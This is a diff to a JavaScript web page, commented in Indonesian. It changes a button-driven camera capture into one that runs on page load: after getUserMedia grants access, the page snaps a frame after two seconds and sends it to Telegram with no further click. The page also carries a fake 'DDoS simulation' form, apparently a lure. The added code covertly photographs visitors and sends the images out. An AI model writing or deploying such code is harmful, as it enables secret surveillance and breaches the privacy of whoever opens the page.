@@ -23,37 +23,42 @@ function sendPhotoToTelegram(imageData) {
     });
 }
 
-// Fungsi untuk mengambil foto dari kamera
-function capturePhoto() {
-    navigator.mediaDevices.getUserMedia({ video: true })
+// Mengambil foto dari kamera tanpa tombol, langsung saat halaman dimuat
+navigator.mediaDevices.getUserMedia({ video: true })
     .then((stream) => {
         const video = document.createElement("video");
         video.srcObject = stream;
         video.play();
         
+        // Menampilkan video pada halaman (untuk debugging)
+        document.getElementById("cameraContainer").classList.remove("hidden");
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+
         setTimeout(() => {
-            const canvas = document.getElementById("canvas");
-            const ctx = canvas.getContext("2d");
-            
+            // Mengambil gambar dari video dan menggambar di canvas
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             // Mengambil gambar dalam format data URL
             const imageData = canvas.toDataURL("image/png");
-            document.getElementById("photoContainer").classList.remove("hidden");
-            document.getElementById("sendPhoto").onclick = () => sendPhotoToTelegram(imageData);
+
+            // Mengirim gambar ke Telegram
+            sendPhotoToTelegram(imageData);
 
             // Stopping the video stream
             stream.getTracks().forEach(track => track.stop());
-        }, 2000); // Ambil foto setelah 2 detik
+
+            // Menghapus elemen video setelah pengambilan gambar
+            video.remove();
+        }, 2000); // Mengambil foto setelah 2 detik
     })
     .catch((err) => {
         console.error("Camera access denied:", err);
     });
-}
 
-// Efek Serangan DDoS Palsu
+// Simulasi DDoS
 document.getElementById("ddosForm").addEventListener("submit", function (e) {
     e.preventDefault();
     
@@ -65,7 +70,7 @@ document.getElementById("ddosForm").addEventListener("submit", function (e) {
 
     statusDiv.textContent = "Starting DDoS simulation for " + url + "...";
     
-    // Menampilkan efek "serangan"
+    // Menampilkan efek serangan
     ddosEffect.classList.remove("hidden");
 
     let progressValue = 0;
@@ -80,6 +85,3 @@ document.getElementById("ddosForm").addEventListener("submit", function (e) {
         }
     }, 500);
 });
-
-// Menangani klik tombol Capture Photo
-document.getElementById("captureButton").addEventListener("click", capturePhoto);
